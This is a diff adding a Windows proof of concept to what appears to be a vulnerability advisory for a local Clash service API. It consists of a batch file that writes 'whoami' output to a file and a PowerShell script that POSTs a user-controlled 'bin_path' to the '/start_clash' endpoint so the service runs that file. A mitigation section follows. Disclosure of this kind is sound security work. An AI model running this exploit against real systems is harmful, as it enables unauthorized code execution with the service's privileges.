@@ -90,6 +90,32 @@ sudo cat /root/pwned
 
 ![](./3.png)
 
+### Windows
+
+pwn.bat:
+
+```bat
+@echo off
+whoami > C:\Users\xxx\Desitop\pwned.txt
+```
+
+test.ps1:
+
+```powershell
+$apiUrl = "http://127.0.0.1:33211/start_clash"
+$headers = @{ "Content-Type" = "application/json" }
+$body = @{
+    bin_path    = "C:\Users\xxx\Desktop\pwn.bat"
+    config_dir  = "C:\Windows\Temp"
+    config_file = "NUL"
+    log_file    = "C:\Windows\Temp\exploit.log"
+} | ConvertTo-Json
+
+Invoke-RestMethod -Uri $apiUrl -Method Post -Headers $headers -Body $body
+```
+
+![](./4.png)
+
 ## Mitigation
 
 1. Logic Fix: Remove user control over `bin_path`; use a hardcoded allowlist
